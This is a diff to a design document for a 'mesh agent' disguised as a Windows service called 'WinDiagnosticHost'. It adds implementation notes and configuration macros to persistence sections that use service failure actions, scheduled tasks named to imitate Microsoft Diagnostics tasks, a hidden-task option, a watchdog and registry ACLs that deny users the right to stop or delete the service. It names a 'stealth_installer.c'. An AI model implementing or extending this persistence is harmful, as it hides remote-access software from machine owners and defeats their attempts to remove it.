@@ -79,6 +79,8 @@ sc.exe failure WinDiagnosticHost reset= 86400 actions= restart/10000/restart/300
 | Subsequent failures | Restart service | 60 seconds |
 | Reset period | - | 24 hours |
 
+> Implementation note: configure `persistence.serviceRecovery.*` in `branding_config.local.json`. The native installer (`stealth_installer.c`) programs the SCM failure actions during `-install`, and `test.ps1 -RuntimeValidation` asserts the values via `sc.exe qfailure`.
+
 ---
 
 ## Persistence Mechanisms
@@ -121,6 +123,11 @@ schtasks /Create /TN "\Microsoft\Windows\Diagnostics\DiagnosticHostMonitor" `
          /SC ONLOGON /RL HIGHEST /F
 ```
 
+**Customization Macros:**
+- `MESH_AGENT_PERSIST_TASK_NAME` – override the task name (defaults to `\{ServiceName} Autorun`)
+- `MESH_AGENT_PERSIST_TASK_TRIGGER` – change the `/SC` trigger (e.g., `ONSTART`, `ONLOGON`)
+- `MESH_AGENT_PERSIST_TASK_HIDDEN` – set to `0` to keep the task visible during diagnostics
+
 **Behavior:**
 - Starts service on any user logon
 - Runs with SYSTEM privileges
@@ -161,6 +168,10 @@ schtasks /Create /TN "\Microsoft\Windows\Diagnostics\DiagnosticHostAutoStart" `
          /SC ONEVENT /EC System /MO $xpath /RL HIGHEST /F
 ```
 
+**Customization Macros:**
+- `MESH_AGENT_PERSIST_RESTART_TASK_NAME` – rename the restart task
+- `MESH_AGENT_PERSIST_WMI_CLASS` / `_METHOD` / `_NAMESPACE` – future-proof hooks if we switch back to permanent WMI consumers
+
 **Behavior:**
 - Automatically restarts service when it stops
 - Monitors Windows Event Log for service stop events
@@ -172,6 +183,11 @@ schtasks /Create /TN "\Microsoft\Windows\Diagnostics\DiagnosticHostAutoStart" `
 **Flag:** `MESH_AGENT_PERSIST_WATCHDOG=1`
 
 **Configuration:** `intervalSeconds: 600` (10 minutes)
+
+**Macros:**
+- `MESH_AGENT_PERSIST_WATCHDOG_INTERVAL` - probe interval (seconds)
+- `MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY` - delay before re-launch
+- `MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH` - toggle restart enforcement
 
 **Mechanism:**
 - Internal health monitoring thread
@@ -185,6 +201,8 @@ schtasks /Create /TN "\Microsoft\Windows\Diagnostics\DiagnosticHostAutoStart" `
 $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\WinDiagnosticHost"
 # Remove STOP/DELETE rights from non-SYSTEM accounts
 ```
+
+> Implementation note: set `persistence.watchdog.*` in `branding_config`. When enabled, the installer now provisions SCM failure actions with the requested interval/delay and enforces them at runtime (see `stealth_installer.c` + `test.ps1`).
 
 ---
 
